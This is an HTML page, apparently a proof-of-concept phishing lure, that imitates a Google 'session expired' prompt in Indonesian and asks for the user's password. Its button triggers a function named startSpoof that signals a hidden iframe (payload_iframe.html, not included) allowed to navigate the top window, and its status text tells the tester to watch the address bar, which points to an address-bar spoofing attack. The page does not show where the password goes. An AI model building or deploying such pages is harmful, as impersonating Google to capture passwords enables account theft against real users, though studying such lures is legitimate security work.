<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Verification</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            background: #fff;
        }

        .container {
            width: 100%;
            max-width: 400px;
            text-align: center;
            padding: 20px;
            border: 1px solid #dadce0;
            border-radius: 8px;
        }

        img {
            width: 75px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 10px;
        }

        p {
            color: #3c4043;
            margin-bottom: 25px;
        }

        input {
            width: 90%;
            padding: 13px;
            margin-bottom: 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
        }

        button {
            width: 95%;
            padding: 10px;
            background: #1a73e8;
            color: white;
            border: none;
            border-radius: 4px;
            font-weight: 500;
            cursor: pointer;
            font-size: 14px;
        }

        #status {
            margin-top: 20px;
            font-size: 11px;
            color: #70757a;
        }
    </style>
</head>

<body>

    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
        <h1>Sesi Berakhir</h1>
        <p>Silakan masukkan kata sandi Anda untuk melanjutkan ke Google.</p>
        <input type="password" id="pass" placeholder="Masukkan kata sandi">
        <button onclick="startSpoof()">Lanjutkan</button>
        <div id="status">Menunggu interaksi user...</div>
    </div>

    <iframe id="spoof_frame" sandbox="allow-scripts allow-top-navigation allow-same-origin" src="payload_iframe.html"
        style="display:none;">
    </iframe>

    <script>
        function startSpoof() {
            const pwd = document.getElementById('pass').value;
            if (!pwd) { alert("Isi password dulu bang!"); return; }

            document.getElementById('status').innerText = "Memicu navigasi... Perhatikan Address Bar!";
            const frame = document.getElementById('spoof_frame');
            frame.contentWindow.postMessage('go', '*');
        }
    </script>
</body>

</html>
